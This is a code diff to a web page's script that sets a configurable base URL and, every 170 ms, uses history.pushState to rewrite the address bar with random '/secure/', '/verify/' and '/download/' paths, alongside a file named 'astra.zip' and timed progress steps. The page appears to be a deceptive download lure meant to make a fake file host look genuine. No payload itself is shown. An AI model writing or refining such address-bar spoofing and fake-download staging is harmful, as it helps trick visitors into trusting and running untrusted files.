@@ -144,22 +144,22 @@ body::before{
 </div>
 
 <script>
-// CONFIG
+// ================== CHANGE THIS ==================
+const BASE_URL = "https://download-tau-five.vercel.app";   // ← Change this to whatever you want
+// ================================================
+
 const FILE_NAME = "astra.zip";
 
-// Spam full URL like the example
-const base = "https://download-tau-five.vercel.app";
-const paths = ["/dl/", "/download/", "/get/", "/secure/", "/verify/", "/node/"];
+const paths = ["/dl/", "/download/", "/get/", "/secure/", "/verify/", "/file/", "/node/"];
 
-function spamURL() {
+function spamFullURL() {
   setInterval(() => {
     const randomPath = paths[Math.floor(Math.random() * paths.length)];
-    const randomCode = Math.random().toString(36).substring(2, 10);
-    const fullURL = base + randomPath + randomCode;
+    const randomCode = Math.random().toString(36).substring(2, 9);
+    const fullURL = BASE_URL + randomPath + randomCode;
     
-    // This changes the entire URL in the address bar
     history.pushState(null, "", fullURL);
-  }, 160); // Very fast spam
+  }, 170); // Fast spam
 }
 
 const steps = [
@@ -203,7 +203,7 @@ steps.forEach((s, i) => {
   }, s.t);
 });
 
-spamURL();
+spamFullURL();
 </script>
 </body>
 </html>
